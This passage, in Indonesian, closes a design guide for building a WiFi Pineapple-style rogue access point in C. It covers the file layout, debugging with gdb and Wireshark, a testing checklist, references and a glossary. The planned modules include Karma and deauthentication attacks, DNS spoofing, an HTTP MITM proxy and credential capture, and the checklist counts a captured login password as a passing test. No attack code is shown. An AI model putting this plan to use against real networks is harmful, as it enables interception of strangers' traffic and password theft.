| **Broadcaster** | `rogue_ap.c` | Kirim beacon, probe response |
| **Attacker** | `karma.c`, `deauth.c` | Serangan Karma & Deauth |
| **Server** | `dhcp.c`, `dns.c` | DHCP & DNS server |
| **MITM** | `proxy.c` | HTTP proxy & capture |
| **Web UI** | `web_ui.c` | Web dashboard |
| **Utils** | `utils.c` | Utility functions |

---

## 10. Struktur Kode

### Struktur Folder Akhir:

```
project/
├── main.c                     # 100-150 lines - Entry point
├── config.h                   # 50-60 lines - Konfigurasi global
├── Makefile                   # 30-50 lines - Build automation
│
├── core/
│   ├── rogue_ap.c             # 300-400 lines - Rogue AP core
│   ├── rogue_ap.h             # 30-40 lines - Deklarasi AP
│   ├── sniffer.c              # 200-300 lines - Sniffer
│   └── sniffer.h              # 20-25 lines - Deklarasi sniffer
│
├── attack/
│   ├── karma.c                # 100-150 lines - Karma attack
│   ├── karma.h                # 10-15 lines - Deklarasi karma
│   ├── deauth.c               # 150-200 lines - Deauth attack
│   └── deauth.h               # 10-15 lines - Deklarasi deauth
│
├── server/
│   ├── dhcp.c                 # 200-300 lines - DHCP server
│   ├── dhcp.h                 # 20-25 lines - Deklarasi DHCP
│   ├── dns.c                  # 150-200 lines - DNS spoofing
│   └── dns.h                  # 10-15 lines - Deklarasi DNS
│
├── mitm/
│   ├── proxy.c                # 300-400 lines - HTTP proxy
│   ├── proxy.h                # 20-25 lines - Deklarasi proxy
│   ├── capture.c              # 150-200 lines - Credential capture
│   └── capture.h              # 10-15 lines - Deklarasi capture
│
├── web/
│   ├── web_ui.c               # 200-300 lines - Web dashboard
│   └── web_ui.h               # 15-20 lines - Deklarasi web
│
├── utils/
│   ├── utils.c                # 200-300 lines - Utility functions
│   ├── utils.h                # 30-40 lines - Deklarasi utility
│   ├── logger.c               # 100-150 lines - Logging
│   └── logger.h               # 10-15 lines - Deklarasi logging
│
└── docs/
    ├── README.md              # Documentation
    ├── 802.11.md              # Teori 802.11
    └── wifi_pineapple.md      # Dokumen ini

TOTAL: ~2000+ lines
```

### Dependencies (Grafik):

```
main.c
├── config.h
├── rogue_ap.h → rogue_ap.c → utils.h
├── sniffer.h  → sniffer.c  → rogue_ap.h, utils.h
├── karma.h    → karma.c    → rogue_ap.h, utils.h
├── deauth.h   → deauth.c   → rogue_ap.h, utils.h
├── dhcp.h     → dhcp.c     → utils.h
├── dns.h      → dns.c      → utils.h
├── proxy.h    → proxy.c    → utils.h, capture.h
├── capture.h  → capture.c  → utils.h
├── web_ui.h   → web_ui.c   → utils.h
└── utils.h    → utils.c
```

---

## 11. Testing & Debugging

### Tools yang Dibutuhkan:

| Tool | Fungsi | Install |
|------|--------|---------|
| **gcc** | Compiler | `sudo apt install gcc` |
| **make** | Build automation | `sudo apt install make` |
| **gdb** | Debugger | `sudo apt install gdb` |
| **wireshark** | Packet analysis | `sudo apt install wireshark` |
| **tcpdump** | CLI packet capture | `sudo apt install tcpdump` |
| **aircrack-ng** | WiFi testing | `sudo apt install aircrack-ng` |
| **valgrind** | Memory leak check | `sudo apt install valgrind` |

### Debugging Strategy:

#### Step 1: Compile dengan Debug Symbol
```bash
gcc -g -o rogue_ap *.c -pthread
```

#### Step 2: Gunakan GDB
```bash
gdb ./rogue_ap
(gdb) break send_beacon
(gdb) run
(gdb) next
(gdb) print *cfg
(gdb) continue
```

#### Step 3: Print Debug
```c
// Tambahkan di kode
#define DEBUG 1

#if DEBUG
    printf("[DEBUG] Sending beacon on channel %d\n", cfg->channel);
    printf("[DEBUG] Frame control: 0x%04x\n", hdr->frame_control);
#endif
```

#### Step 4: Wireshark Capture
```bash
# Terminal 1: Jalankan program
sudo ./rogue_ap

# Terminal 2: Capture dengan wireshark
sudo wireshark -i wlan0 -k

# Filter di wireshark: wlan.fc.type == 0
```

### Testing Checklist:

| Fitur | Test | Expected | Status |
|-------|------|----------|--------|
| **Beacon** | Scan WiFi dari HP | SSID "FreeWiFi" muncul | ⬜ |
| **Probe Response** | HP scan WiFi | Response terkirim | ⬜ |
| **Auth** | HP connect | Auth success | ⬜ |
| **Assoc** | HP connect | Assoc success | ⬜ |
| **Karma** | HP cari AP | Auto-connect | ⬜ |
| **Deauth** | HP connected | Disconnect | ⬜ |
| **DHCP** | HP connect | Dapat IP | ⬜ |
| **DNS** | Buka website | Redirect | ⬜ |
| **MITM** | HTTP login | Password capture | ⬜ |
| **Web UI** | Buka browser | Dashboard muncul | ⬜ |

---

## 12. Referensi

### 12.1. Buku:
- "802.11 Wireless Networks" - Matthew Gast
- "WiFi Security" - Johnny Cache
- "The Linux Programming Interface" - Michael Kerrisk
- "The C Programming Language" - Kernighan & Ritchie

### 12.2. Website:
- IEEE 802.11: https://standards.ieee.org/
- Wi-Fi Alliance: https://www.wi-fi.org/
- Linux Wireless: https://wireless.wiki.kernel.org
- Hak5 Pineapple: https://shop.hak5.org/products/wifi-pineapple
- Wireshark 802.11: https://wiki.wireshark.org/802.11

### 12.3. Tools:
- Wireshark - Packet analysis
- Aircrack-ng - WiFi security testing
- hostapd - Software AP
- Linux nl80211 - Kernel interface
- tcpdump - CLI packet capture

---

## 13. Lampiran

### A. Istilah Penting

| Istilah | Arti |
|---------|------|
| BSSID | MAC address AP |
| SSID | Nama jaringan |
| Beacon | Frame broadcast AP |
| Probe | Frame request/response |
| MIMO | Multiple Input Multiple Output |
| MU-MIMO | Multi-User MIMO |
| OFDMA | Orthogonal Frequency Division Multiple Access |
| TWT | Target Wake Time |
| MITM | Man-in-the-Middle |
| Karma | Menjawab semua probe request |

### B. Channel WiFi (2.4 GHz)

| Channel | Frekuensi (GHz) | Overlap |
|---------|-----------------|---------|
| 1 | 2.412 | Tidak |
| 6 | 2.437 | Tidak |
| 11 | 2.462 | Tidak |

### C. Checklist Fitur

| Fitur | Status | Keterangan |
|-------|--------|------------|
| Rogue AP Basic | ⬜ | Beacon, probe, auth, assoc |
| Karma Attack | ⬜ | Respond all probe |
| Deauth Attack | ⬜ | Disconnect client |
| Multiple SSID | ⬜ | 10+ SSID |
| DHCP Server | ⬜ | IP assignment |
| DNS Spoofing | ⬜ | Domain redirect |
| MITM Proxy | ⬜ | HTTP interception |
| Credential Capture | ⬜ | Password logging |
| Web Dashboard | ⬜ | Monitoring UI |
| Logging | ⬜ | Activity log |

### D. Urutan Pembuatan File

```
1. config.h         (konfigurasi global)
2. utils.h / .c     (utility functions)
3. rogue_ap.h / .c  (Rogue AP core)
4. sniffer.h / .c   (Sniffer)
5. main.c           (Entry point)
6. karma.h / .c     (Karma attack)
7. deauth.h / .c    (Deauth attack)
8. dhcp.h / .c      (DHCP server)
9. dns.h / .c       (DNS spoofing)
10. capture.h / .c  (Credential capture)
11. proxy.h / .c    (MITM proxy)
12. web_ui.h / .c   (Web dashboard)
13. logger.h / .c   (Logging)
14. Makefile        (Build automation)
15. README.md       (Documentation)
```

### E. Format Markdown untuk Unduh

```markdown
# Cara Mengunduh

1. Copy seluruh teks di atas
2. Paste ke text editor
3. Save sebagai `wifi_pineapple.md`
4. Baca dengan Markdown viewer
```

---

**Akhir Dokumen**

> *"Building your own WiFi Pineapple is the best way to understand WiFi security."*